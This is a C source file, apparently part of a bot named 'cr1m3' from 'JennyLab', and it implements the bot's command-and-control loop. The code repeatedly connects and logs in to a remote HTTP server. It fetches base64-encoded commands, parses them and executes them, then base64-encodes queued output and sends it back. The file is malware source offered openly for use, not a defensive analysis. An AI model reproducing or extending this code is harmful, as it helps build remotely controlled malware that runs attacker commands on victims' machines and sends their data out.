/*
 * cr1m3 // JennyLab
 * cr1m3/src/cc_monitor.c
 * @ Public Domain License
 */


#include "api.h"
#include "misc.h"
#include "http.h"
#include "base64.h"
#include "command.h"
#include "task_reply.h"
#include "misc.h"

int last_command = 1;
int last_pop = 1;
int wait_minutes = 0;

//untested new version
unsigned long __stdcall __bot_http(void *params) {
	cmd_data data = { 0 };
	char *reply = (char *)__alloc(2048);
	char *pop_data = (char *)__alloc(2048);
	char *encoded = (char *)__alloc(4096);
	char *decoded = (char *)__alloc(4096);
	int option = 0;

	while (__hxxp_connect() <= 0x00) {
		__wait_min(10);
		__hxxp_close();

	}

		__hxxp_login();
		__hxxp_close();
	

	while (1) {
		while (__hxxp_connect() <= 0x00) {
			__hxxp_close();
			__wait_min(10);
		}
		if (__hxxp_reply(reply) != 0) {
			last_command = 0;
			if (reply) {
				if (__base64_decode(reply, _lstrlenA(reply), decoded) == TRUE) {
					last_command = 1;
					__command_initialize(&data);
					if (__command_parser(decoded, &data) == 0) {
						__command_control(&data);
						__command_free(&data);
					}

					_ZeroMemory(decoded,4096);
				}
			}
		}
		else {
			last_command = 0;
		}



		last_pop = 0;
		while ((option = __pop_reply(pop_data)) != -1) {
			last_pop = 1;
			if (__base64_encode(pop_data, _lstrlenA(pop_data), encoded) == TRUE)
				__hxxp_request(option, encoded, "");


			_ZeroMemory(pop_data, 2048);
			_ZeroMemory(encoded, 4096);
		}

		if (last_pop == 0 && last_command == 0) {
			if (wait_minutes >= 5)
				wait_minutes++;

			_Sleep(1000);
			//__wait_min(wait_minutes);
		}

		_ZeroMemory(reply, 2048);
		__hxxp_close();

	}
	return(0);
}
